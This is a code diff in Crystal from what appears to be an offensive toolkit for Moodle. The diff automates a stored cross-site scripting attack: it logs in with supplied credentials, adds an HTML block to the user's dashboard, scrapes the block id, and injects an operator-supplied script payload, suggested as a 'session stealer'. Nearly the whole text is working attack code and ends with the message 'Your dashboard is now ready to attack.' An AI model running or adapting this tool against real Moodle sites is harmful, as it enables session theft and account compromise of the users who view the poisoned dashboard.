@@ -7,36 +7,63 @@ require "base64"
 module TMoodleActions
   class DashboardXSS
     def perform(target)
-      puts "[?] Enter your session key. Use the helper command."
-      sess_key = gets()
-      puts "[?] Enter your moodle session."
-      moodle_session = gets().not_nil!
-      puts "[?] Visit #{target}/my/index.php?sesskey=#{sess_key}&bui_addblock=html to add an HTML block to your dashboard. Once the block is added, click on configure, copy the URL, paste it, and hit enter."
-      block_edit_url = gets()
-      block_regex = block_edit_url.not_nil!.match(/sesskey=(?<sess_key>.*)&bui_editid=(?<edit_id>.*)/)
-      session_key = block_regex.try &.["sess_key"]
-      block_id = block_regex.try &.["edit_id"]
-      puts "[*] Session key: #{session_key}"
+      puts "[?] Enter your Moodle username"
+      username = gets().not_nil!
+      puts "[?] Enter your Moodle password"
+      psw = gets().not_nil!
+      sess_info = SessionInfo.new
+      session = sess_info.get_session(target, username, psw)
+      sess_key = session["session_key"]
+      headers = HTTP::Headers.new
+      headers.add("Cookie", "MoodleSession=" + session["moodle_session"])
+      headers.add("Content-Type", "application/x-www-form-urlencoded")
+      params = HTTP::Params.build do |form|
+        form.add "edit", "1"
+        form.add "sesskey", sess_key
+      end
+      post = HTTP::Client.post(target + "/my/index.php", headers: headers, body: params)
+
+      add_block = http_get("#{target}/my/index.php?bui_addblock&sesskey=#{sess_key}&bui_addblock=html", session["moodle_session"])
+
+      dashboard_with_block = http_get("#{target}/my/index.php", session["moodle_session"]).body
+      block_id = dashboard_with_block.match(/\(new HTML block\)<\/a>(?:\s)*<aside id="inst(?<block_id>([0-9])+)"/).not_nil!.named_captures["block_id"]
       puts "[*] Block id: #{block_id}"
       puts "[?] Enter an XSS payload (e.g. session stealer) to send including <script> tags:"
       payload = gets().not_nil!
       puts "[>] Sending payload to target..."
       headers = HTTP::Headers.new
-      headers.add("Cookie", "MoodleSession=" + moodle_session)
+      headers.add("Cookie", "MoodleSession=" + session["moodle_session"])
       headers.add("Content-Type", "application/x-www-form-urlencoded")
       # data = HTTP::Params.encode(data)
       params = HTTP::Params.build do |form|
         form.add "bui_editid", block_id
-        form.add "sesskey", session_key
+        form.add "sesskey", sess_key
         form.add "_qf__block_html_edit_form", "1"
         form.add "config_text[text]", payload
+        form.add "config_title", ""
       end
       post = HTTP::Client.post(target + "/my/index.php", headers: headers, body: params)
-      if post.status_code == 301
+
+      headers = HTTP::Headers.new
+      headers.add("Cookie", "MoodleSession=" + session["moodle_session"])
+      headers.add("Content-Type", "application/x-www-form-urlencoded")
+      params = HTTP::Params.build do |form|
+        form.add "edit", ""
+        form.add "sesskey", sess_key
+      end
+      post = HTTP::Client.post(target + "/my/index.php", headers: headers, body: params)
+
+      if post.status_code == 200
         puts "[***] Payload delivered. Your dashboard is now ready to attack."
       else
-        puts "[!] Error: " + post.body
+        puts "[!] Error!"
       end
+    end
+
+    private def http_get(url, moodle_session)
+      headers = HTTP::Headers.new
+      headers.add("Cookie", "MoodleSession=" + moodle_session.to_s)
+      return HTTP::Client.get(url, headers: headers)
     end
   end
 end
